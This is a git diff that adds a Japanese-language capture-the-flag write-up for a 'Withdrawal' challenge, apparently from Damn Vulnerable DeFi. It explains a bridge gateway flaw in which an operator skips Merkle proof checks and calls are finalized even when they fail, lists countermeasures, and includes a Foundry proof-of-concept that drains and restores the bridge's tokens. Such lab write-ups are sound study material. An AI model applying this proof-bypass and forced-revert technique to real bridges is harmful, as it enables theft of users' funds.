@@ -572,3 +572,55 @@ by tinamints
         for (uint256 i = 0; i < users.length; i++) lending.liquidate(users[i]);
     }
 }`
+
+
+## 18. Withdrawal
+### 条件 :
+- 与えられた4つのwithdrawal（怪しいものも含む）をすべてL1 gatewayでfinalizeする（counter >= 4）
+- token bridgeは資金の99%超を保持する（1%未満の損失で、かつ悪意あるものもfinalizeする）
+- playerは最終的にtokenを0にする
+### 概念 :
+-  アクセス制御の不備（operatorはproof検証をスキップできる）
+-  呼び出し前にfinalize / 戻り値を無視
+-  underflowを利用して呼び出しをわざと失敗させる
+### 解法 :
+- `L1Gateway.finalizeWithdrawal()`は`OPERATOR_ROLE`を持つ者（player）なら**空のMerkle proof**でwithdrawalをfinalizeでき、しかも外部呼び出しの**前に**leafをfinalized扱いにしてcounterを増やし、その**呼び出しの成否を無視する**。7日の遅延はoperatorにも適用されるので、単に`vm.warp`で飛ばすだけでよい（timestampの細工は不要）。
+- 4つのwithdrawalのうち3つは正当な10 DVTの送金で、1つ（index 2）が悪意あるもので999,000 DVTを引き出してbridgeを空にする。このleafを、token送金を実際には成立させずにfinalizeする必要がある。
+- 手順（すべてoperatorとして、`withdrawals.json`のpayloadをそのままreplay）：(1) 正当な3つをfinalize；(2) **自作**のwithdrawalをfinalizeして999,000 DVTをplayerへ引き出し、bridgeを空にする；(3) 悪意あるものをfinalize — ここで`TokenBridge.executeTokenWithdrawal`が`totalDeposits -= 999_000e18`を行い**underflowしてrevert**するため、leafは記録されるがtokenは動かない；(4) 999,000 DVTをbridgeへ返す（playerは0になる）
+### 対策 :
+- 特権ロールがproof検証をスキップできないようにし、finalized扱いにする前にmessageが実際に成功したかを確認し（呼び出しの戻り値/revertをチェック）、1つのmessageでbridgeを空にできないようwithdrawalごとの金額上限を設ける
+### POC
+` function test_withdrawal() public checkSolvedByPlayer {
+        vm.warp(block.timestamp + l1Gateway.DELAY() + 1 days);
+        bytes32[] memory noProof = new bytes32[](0);
+        string memory logs = vm.readFile("test/withdrawal/withdrawals.json");
+
+        // 1) 正当な3つのwithdrawalをfinalize（各10 DVT）
+        _finalizeLog(logs, 0, noProof);
+        _finalizeLog(logs, 1, noProof);
+        _finalizeLog(logs, 3, noProof);
+
+        // 2) operatorとして自作のwithdrawalでbridgeの資金をplayerへ抜く
+        uint256 drain = 999_000e18;
+        bytes memory inner = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", player, drain);
+        bytes memory fwd = abi.encodeWithSignature(
+            "forwardMessage(uint256,address,address,bytes)", uint256(1000), player, address(l1TokenBridge), inner
+        );
+        l1Gateway.finalizeWithdrawal(1000, l2Handler, address(l1Forwarder), START_TIMESTAMP, fwd, noProof);
+
+        // 3) 悪意あるものをfinalize -> 内部送金がunderflowでrevert、それでもfinalizeされる
+        _finalizeLog(logs, 2, noProof);
+
+        // 4) 抜いたtokenをbridgeへ返す（playerは0に）
+        token.transfer(address(l1TokenBridge), drain);
+    }`
+
+`// L2 withdrawalのlogをfinalizeWithdrawal経由でreplay（operator, proof不要）
+    // log data = abi.encode(bytes32 id, uint256 timestamp, bytes message); topics[1]=nonce
+    function _finalizeLog(string memory logs, uint256 i, bytes32[] memory noProof) private {
+        string memory base = string.concat("[", vm.toString(i), "]");
+        uint256 nonce = uint256(vm.parseJsonBytes32(logs, string.concat(base, ".topics[1]")));
+        bytes memory data = vm.parseJsonBytes(logs, string.concat(base, ".data"));
+        (, uint256 timestamp, bytes memory message) = abi.decode(data, (bytes32, uint256, bytes));
+        l1Gateway.finalizeWithdrawal(nonce, l2Handler, address(l1Forwarder), timestamp, message, noProof);
+    }`
